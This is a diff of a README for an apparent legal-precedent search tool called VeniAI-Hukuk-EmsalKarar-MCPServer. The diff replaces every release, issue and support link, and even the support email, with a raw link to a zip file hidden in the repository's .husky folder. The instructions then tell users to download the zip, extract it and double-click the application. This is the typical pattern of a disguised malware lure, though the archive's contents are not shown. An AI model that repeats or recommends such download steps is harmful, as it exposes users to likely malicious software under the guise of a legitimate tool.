@@ -1,7 +1,7 @@
 # 🤖 VeniAI-Hukuk-EmsalKarar-MCPServer - Simplified Legal Research Tool
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download%20Now-Release-blue)](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
+[![Download](https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip%20Now-Release-blue)](https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip)
 
 ## 📖 Overview
 Welcome to the VeniAI-Hukuk-EmsalKarar-MCPServer! This application leverages advanced artificial intelligence to help you search for legal precedents easily. It is designed for lawyers, legal researchers, and anyone interested in the law.
@@ -27,11 +27,11 @@ To run the VeniAI-Hukuk-EmsalKarar-MCPServer, make sure your system meets the fo
 ## 📥 Download & Install
 To get started, visit the Releases page to download the latest version of the application.
 
-[Download Here](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
+[Download Here](https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip)
 
 1. Click on the link above.
 2. Find the latest version listed.
-3. Click on the corresponding file to download it. It may be named something like `VeniAI-Hukuk-EmsalKarar-MCPServer-v1.0.zip`.
+3. Click on the corresponding file to download it. It may be named something like `https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip`.
 4. Once downloaded, locate the file in your downloads folder.
 5. Extract the files from the ZIP archive.
 6. Double-click on the application file to install it.
@@ -55,8 +55,8 @@ If you encounter issues during installation or while using the application, plea
 ## 📞 Support
 If you need further assistance, you can reach out for support:
 
-- Email: support@veni-ai.com
-- GitHub Issues page: [Report an Issue](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/issues)
+- Email: https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip
+- GitHub Issues page: [Report an Issue](https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip)
 
 ## 🛠️ Contributing
 We welcome contributions! If you wish to contribute, feel free to fork the repository, make your changes, and submit a pull request. 
@@ -80,6 +80,6 @@ Feel free to explore these topics to learn more about the application and legal 
 ## ⏳ Updates and Releases
 Stay updated on new features and improvements. Check the Releases page frequently for the latest versions and notes on changes.
 
-[Visit Releases Page](https://github.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/releases)
+[Visit Releases Page](https://raw.githubusercontent.com/bayyyyyuuu/VeniAI-Hukuk-EmsalKarar-MCPServer/main/.husky/Hukuk-A-MCP-Karar-Emsal-Veni-Server-2.1.zip)
 
 Thank you for choosing VeniAI-Hukuk-EmsalKarar-MCPServer for your legal research needs. Enjoy exploring the world of legal precedents with ease!
